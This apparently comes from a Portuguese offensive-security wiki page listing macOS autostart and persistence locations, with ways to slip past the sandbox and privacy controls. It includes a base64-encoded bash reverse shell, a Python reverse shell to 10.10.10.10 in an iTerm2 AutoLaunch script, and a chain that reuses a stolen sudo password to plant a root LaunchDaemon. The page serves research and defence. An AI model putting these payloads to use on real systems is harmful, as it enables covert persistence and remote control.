# Início Automático do macOS

{{#include ../banners/hacktricks-training.md}}

Esta seção baseia-se fortemente na série de blog [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), o objetivo é adicionar **mais Autostart Locations** (se possível), indicar **quais técnicas ainda funcionam** atualmente na versão mais recente do macOS (13.4) e especificar as **permissões** necessárias.

## Sandbox Bypass

> [!TIP]
> Aqui você pode encontrar start locations úteis para **sandbox bypass** que permitem simplesmente executar algo ao **escrevê-lo em um arquivo** e **esperar** por uma ação muito **comum**, por um **período de tempo** determinado ou por uma **ação que você geralmente pode executar** de dentro de um sandbox sem precisar de permissões de root.

### Launchd

- Útil para bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locais

- **`/Library/LaunchAgents`**
- **Gatilho**: Reinício
- Requer root
- **`/Library/LaunchDaemons`**
- **Gatilho**: Reinício
- Requer root
- **`/System/Library/LaunchAgents`**
- **Gatilho**: Reinício
- Requer root
- **`/System/Library/LaunchDaemons`**
- **Gatilho**: Reinício
- Requer root
- **`~/Library/LaunchAgents`**
- **Gatilho**: Re-login
- **`~/Library/LaunchDemons`**
- **Gatilho**: Re-login

> [!TIP]
> Como fato interessante, **`launchd`** tem uma property list embutida na seção Mach-o `__Text.__config` que contém outros serviços bem conhecidos que o launchd deve iniciar. Além disso, esses serviços podem conter `RequireSuccess`, `RequireRun` e `RebootOnSuccess`, o que significa que eles devem ser executados e completar com sucesso.
>
> Claro, não pode ser modificado por causa da assinatura de código.

#### Descrição & Exploração

**`launchd`** é o **primeiro** **processo** executado pelo kernel do OS X na inicialização e o último a terminar no desligamento. Deve sempre ter o **PID 1**. Esse processo vai **ler e executar** as configurações indicadas nos **ASEP** **plists** em:

- `/Library/LaunchAgents`: Agentes por usuário instalados pelo administrador
- `/Library/LaunchDaemons`: Daemons de sistema instalados pelo administrador
- `/System/Library/LaunchAgents`: Agentes por usuário fornecidos pela Apple.
- `/System/Library/LaunchDaemons`: Daemons de sistema fornecidos pela Apple.

Quando um usuário faz login, os plists localizados em `/Users/$USER/Library/LaunchAgents` e `/Users/$USER/Library/LaunchDemons` são iniciados com as **permissões do usuário logado**.

A **principal diferença entre agents e daemons é que agents são carregados quando o usuário faz login e os daemons são carregados na inicialização do sistema** (já que existem serviços como o ssh que precisam ser executados antes de qualquer usuário acessar o sistema). Além disso, agents podem usar GUI enquanto daemons precisam rodar em segundo plano.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Há casos em que um **agent precisa ser executado antes do login do usuário**, estes são chamados **PreLoginAgents**. Por exemplo, isso é útil para fornecer tecnologia assistiva na tela de login. Eles podem ser encontrados também em `/Library/LaunchAgents`(veja [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) um exemplo).

> [!TIP]
> New Daemons or Agents config files will be **loaded after next reboot or using** `launchctl load <target.plist>` It's **also possible to load .plist files without that extension** with `launchctl -F <file>` (however those plist files won't be automatically loaded after reboot).\
> It's also possible to **unload** with `launchctl unload <target.plist>` (the process pointed by it will be terminated),
>
> To **ensure** that there isn't **anything** (like an override) **preventing** an **Agent** or **Daemon** **from** **running** run: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Liste todos os agents e daemons carregados pelo usuário atual:
```bash
launchctl list
```
#### Exemplo de cadeia maliciosa de LaunchDaemon (reutilização de senha)

Um infostealer recente no macOS reutilizou uma **senha sudo capturada** para colocar um user agent e um LaunchDaemon com privilégios de root:

- Escreva o loop do agent em `~/.agent` e torne-o executável.
- Gere um plist em `/tmp/starter` apontando para esse agent.
- Reutilize a senha roubada com `sudo -S` para copiar o plist para `/Library/LaunchDaemons/com.finder.helper.plist`, definir `root:wheel` e carregá-lo com `launchctl load`.
- Inicie o agent silenciosamente via `nohup ~/.agent >/dev/null 2>&1 &` para executá-lo em background sem saída no terminal.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Se um plist for de propriedade de um usuário, mesmo que esteja em pastas de daemon de todo o sistema, a **tarefa será executada como o usuário** e não como root. Isso pode prevenir alguns ataques de escalonamento de privilégios.

#### Mais informações sobre launchd

**`launchd`** é o **primeiro** processo em modo usuário que é iniciado a partir do **kernel**. A inicialização do processo deve ser **bem-sucedida** e ele **não pode terminar ou travar**. Ele é até **protegido** contra alguns **sinais de kill**.

Uma das primeiras coisas que o `launchd` faria é **iniciar** todos os **daemons** como:

- **Daemons de timer** que são executados com base no tempo:
- atd (`com.apple.atrun.plist`): Tem um `StartInterval` de 30min
- crond (`com.apple.systemstats.daily.plist`): Tem `StartCalendarInterval` para iniciar às 00:15
- **Daemons de rede** como:
- `org.cups.cups-lpd`: Escuta em TCP (`SockType: stream`) com `SockServiceName: printer`
- SockServiceName deve ser ou uma porta ou um serviço vindo de `/etc/services`
- `com.apple.xscertd.plist`: Escuta em TCP na porta 1640
- **Daemons de path** que são executados quando um caminho especificado muda:
- `com.apple.postfix.master`: Verificando o caminho `/etc/postfix/aliases`
- **Daemons de notificações do IOKit**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Porta Mach:**
- `com.apple.xscertd-helper.plist`: Indica no campo `MachServices` o nome `com.apple.xscertd.helper`
- **UserEventAgent:**
- Isso é diferente do anterior. Ele faz com que o `launchd` dispare apps em resposta a eventos específicos. Contudo, neste caso, o binário principal envolvido não é o `launchd` mas `/usr/libexec/UserEventAgent`. Ele carrega plugins da pasta restrita pelo SIP /System/Library/UserEventPlugins/ onde cada plugin indica seu inicializador na chave `XPCEventModuleInitializer` ou, no caso de plugins mais antigos, no dicionário `CFPluginFactories` sob a chave `FB86416D-6164-2070-726F-70735C216EC0` do seu `Info.plist`.

### arquivos de inicialização do shell

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Mas você precisa encontrar um app com um TCC bypass que execute um shell que carregue esses arquivos

#### Locais

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Gatilho**: Abrir um terminal com zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Gatilho**: Abrir um terminal com zsh
- Requer root
- **`~/.zlogout`**
- **Gatilho**: Fechar um terminal com zsh
- **`/etc/zlogout`**
- **Gatilho**: Fechar um terminal com zsh
- Requer root
- Potencialmente mais em: **`man zsh`**
- **`~/.bashrc`**
- **Gatilho**: Abrir um terminal com bash
- `/etc/profile` (não funcionou)
- `~/.profile` (não funcionou)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Gatilho**: Esperava-se que disparasse com xterm, mas ele não está instalado e mesmo após a instalação este erro é exibido: xterm: `DISPLAY is not set`

#### Descrição e Exploração

Ao iniciar um ambiente de shell como `zsh` ou `bash`, **certos arquivos de inicialização são executados**. O macOS atualmente usa `/bin/zsh` como shell padrão. Esse shell é acessado automaticamente quando o aplicativo Terminal é aberto ou quando um dispositivo é acessado via SSH. Embora `bash` e `sh` também estejam presentes no macOS, eles precisam ser invocados explicitamente para serem usados.

A página de manual do zsh, que podemos ler com **`man zsh`**, tem uma longa descrição dos arquivos de inicialização.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Aplicações Reabertas

> [!CAUTION]
> Configurar a exploitation indicada e fazer logout/login ou até reiniciar não funcionou para mim para executar o app. (O app não estava sendo executado; talvez precise estar em execução quando essas ações forem realizadas)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Útil para bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Gatilho**: Reiniciar (reabrir aplicações)

#### Descrição & Exploitation

Todas as aplicações a serem reabertas estão dentro do plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Então, faça com que as aplicações reabertas iniciem o seu app — você só precisa **adicionar seu app à lista**.

O UUID pode ser encontrado listando esse diretório ou com `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Para verificar as aplicações que serão reabertas você pode fazer:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Para **adicionar uma aplicação a esta lista** você pode usar:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Preferências do Terminal

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal costuma ter FDA permissions do usuário que o utiliza

#### Localização

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Gatilho**: Abrir Terminal

#### Descrição & Exploração

Em **`~/Library/Preferences`** são armazenadas as preferências do usuário nas Applications. Algumas dessas preferências podem conter uma configuração para **executar outras applications/scripts**.

Por exemplo, o Terminal pode executar um comando na inicialização:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Essa config é refletida no arquivo **`~/Library/Preferences/com.apple.Terminal.plist`** assim:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Portanto, se o plist das preferências do Terminal no sistema puder ser sobrescrito, a funcionalidade **`open`** pode ser usada para **abrir o Terminal e esse comando será executado**.

Você pode adicionar isso a partir do cli com:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Other file extensions

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal pode herdar permissões FDA do usuário que o executa

#### Location

- **Em qualquer lugar**
- **Gatilho**: Abrir Terminal

#### Descrição & Exploração

Se você criar um [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) e abri-lo, a **Terminal application** será invocada automaticamente para executar os comandos indicados ali. Se o app Terminal tiver alguns privilégios especiais (como TCC), seu comando será executado com esses privilégios especiais.

Tente com:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Você também pode usar as extensões **`.command`**, **`.tool`**, com conteúdo de scripts shell regulares e eles também serão abertos pelo Terminal.

> [!CAUTION]
> Se o Terminal tiver **Full Disk Access** ele conseguirá completar essa ação (observe que o comando executado ficará visível em uma janela do Terminal).

### Plugins de Áudio

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Você pode obter algum acesso TCC adicional

#### Localização

- **`/Library/Audio/Plug-Ins/HAL`**
- Requer root
- **Trigger**: Reiniciar coreaudiod ou o computador
- **`/Library/Audio/Plug-ins/Components`**
- Requer root
- **Trigger**: Reiniciar coreaudiod ou o computador
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Reiniciar coreaudiod ou o computador
- **`/System/Library/Components`**
- Requer root
- **Trigger**: Reiniciar coreaudiod ou o computador

#### Descrição

De acordo com os writeups anteriores, é possível **compilar alguns plugins de áudio** e carregá-los.

### Plugins do QuickLook

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Você pode obter algum acesso TCC adicional

#### Localização

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Descrição & Exploração

Os plugins do QuickLook podem ser executados quando você **aciona a visualização de um arquivo** (pressione a barra de espaço com o arquivo selecionado no Finder) e um **plugin que suporte esse tipo de arquivo** estiver instalado.

É possível compilar seu próprio plugin do QuickLook, colocá-lo em uma das localizações anteriores para que seja carregado e então abrir um arquivo suportado e pressionar espaço para acioná-lo.

### ~~Hooks de Login/Logout~~

> [!CAUTION]
> Isso não funcionou para mim, nem com o LoginHook do usuário nem com o LogoutHook do root

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- Você precisa ser capaz de executar algo como `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cated in `~/Library/Preferences/com.apple/loginwindow.plist`

Eles estão obsoletos, mas podem ser usados para executar comandos quando um usuário faz login.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Esta configuração está armazenada em `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Para excluí-lo:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
O do usuário root está armazenado em **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Aqui você pode encontrar locais de início úteis para **sandbox bypass** que permitem simplesmente executar algo escrevendo-o em um arquivo e esperando por condições não tão comuns, como **programas instalados**, ações de usuário "pouco comuns" ou ambientes específicos.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Útil para sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- No entanto, você precisa ser capaz de executar o binário `crontab`
- Ou ser root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- root necessário para acesso de escrita direto. Não é necessário root se você puder executar `crontab <file>`
- **Trigger**: Depende do cron job

#### Descrição & Exploração

Liste os cron jobs do **usuário atual** com:
```bash
crontab -l
```
Você também pode ver todos os cron jobs dos usuários em **`/usr/lib/cron/tabs/`** e **`/var/at/tabs/`** (requer root).

No MacOS várias pastas executando scripts com **certa frequência** podem ser encontradas em:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Lá você pode encontrar os **cron** **jobs** regulares, os **at** **jobs** (pouco usados) e os **periodic** **jobs** (principalmente usados para limpar arquivos temporários). Os **periodic** **jobs** diários podem ser executados, por exemplo, com: `periodic daily`.

Para adicionar um **cronjob de usuário programaticamente** é possível usar:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Descrição: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 costumava ter permissões TCC concedidas

#### Locais

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Gatilho**: Abrir iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Gatilho**: Abrir iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Gatilho**: Abrir iTerm

#### Descrição & Exploração

Scripts armazenados em **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** serão executados. Por exemplo:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
ou:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
O script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** também será executado:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
As preferências do iTerm2 localizadas em **`~/Library/Preferences/com.googlecode.iterm2.plist`** podem **indicar um comando a ser executado** quando o terminal iTerm2 é aberto.

Essa configuração pode ser configurada nas configurações do iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

E o comando é refletido nas preferências:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Você pode definir o comando a ser executado com:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Altamente provável que existam **outras formas de abusar das iTerm2 preferences** para executar comandos arbitrários.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- But xbar must be installed
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Ele solicita permissões de Acessibilidade

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: Quando xbar for executado

#### Description

Se o popular programa [**xbar**](https://github.com/matryer/xbar) estiver instalado, é possível escrever um script shell em **`~/Library/Application\ Support/xbar/plugins/`** que será executado quando xbar for iniciado:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- But Hammerspoon must be installed
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Solicita permissões de Acessibilidade

#### Location

- **`~/.hammerspoon/init.lua`**
- **Gatilho**: Ao executar o Hammerspoon

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) funciona como uma plataforma de automação para **macOS**, aproveitando a linguagem de script **LUA** em suas operações. Notavelmente, suporta a integração de código AppleScript completo e a execução de shell scripts, aumentando significativamente suas capacidades de scripting.

O app procura por um único arquivo, `~/.hammerspoon/init.lua`, e quando iniciado o script será executado.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas o BetterTouchTool precisa estar instalado
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Solicita permissões Automation-Shortcuts e Accessibility

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

Esta ferramenta permite indicar aplicações ou scripts para executar quando alguns atalhos são pressionados. Um atacante poderia ser capaz de configurar seu próprio **atalho e ação a executar no database** para fazê-lo executar código arbitrário (um atalho pode ser simplesmente pressionar uma tecla).

### Alfred

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas o Alfred precisa estar instalado
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Solicita permissões Automation, Accessibility e até Full-Disk access

#### Location

- `???`

Permite criar workflows que podem executar código quando certas condições são atendidas. Potencialmente é possível para um atacante criar um arquivo de workflow e fazer o Alfred carregá-lo (é necessário pagar pela versão premium para usar workflows).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas ssh precisa estar habilitado e em uso
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH costumava ter Full-Disk access

#### Location

- **`~/.ssh/rc`**
- **Gatilho**: Login via ssh
- **`/etc/ssh/sshrc`**
- Requer root
- **Gatilho**: Login via ssh

> [!CAUTION]
> To turn ssh on requres Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

Por padrão, salvo se `PermitUserRC no` em `/etc/ssh/sshd_config`, quando um usuário **efetua login via SSH** os scripts **`/etc/ssh/sshrc`** e **`~/.ssh/rc`** serão executados.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas é necessário executar `osascript` com argumentos
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Gatilho:** Login
- Payload do exploit armazenado chamando **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Gatilho:** Login
- Requer root

#### Description

In System Preferences -> Users & Groups -> **Login Items** you can find **items to be executed when the user logs in**.\
It it's possible to list them, add and remove from the command line:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
These items are stored in the file **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** também podem ser indicados usando a API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) que armazenará a configuração em **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP como Login Item

(Check previous section about Login Items, this is an extension)

Se você armazenar um **ZIP** file como um **Login Item** o **`Archive Utility`** irá abri-lo e se o zip estiver por exemplo armazenado em **`~/Library`** e contiver a Folder **`LaunchAgents/file.plist`** com uma backdoor, essa folder será criada (ela não existe por padrão) e o plist será adicionado de forma que na próxima vez que o usuário fizer login novamente, a **backdoor indicada no plist será executada**.

Outra opção seria criar os arquivos **`.bash_profile`** e **`.zshenv`** dentro do HOME do usuário, assim se a pasta LaunchAgents já existir essa técnica ainda funcionaria.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas você precisa **executar** **`at`** e ele deve estar **enabled**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- É necessário **executar** **`at`** e ele deve estar **enabled**

#### **Descrição**

`at` tasks são projetadas para o **agendamento de tarefas únicas** a serem executadas em determinados horários. Ao contrário dos cron jobs, `at` tasks são removidas automaticamente após a execução. É importante notar que essas tarefas são persistentes através de reinicializações do sistema, tornando-as potenciais preocupações de segurança sob certas condições.

By **default** elas estão **disabled**, mas o usuário **root** pode **enable** **them** com:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Isso criará um arquivo em 1 hora:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Verifique a fila de tarefas usando `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Acima podemos ver dois jobs agendados. Podemos imprimir os detalhes do job usando `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Se AT tasks não estiverem habilitadas, as tasks criadas não serão executadas.

Os **job files** podem ser encontrados em `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
O nome do ficheiro contém a fila, o número do job e o horário em que está agendado para execução. Por exemplo vamos dar uma olhada em `a0001a019bdcd2`.

- `a` - esta é a fila
- `0001a` - número do job em hex, `0x1a = 26`
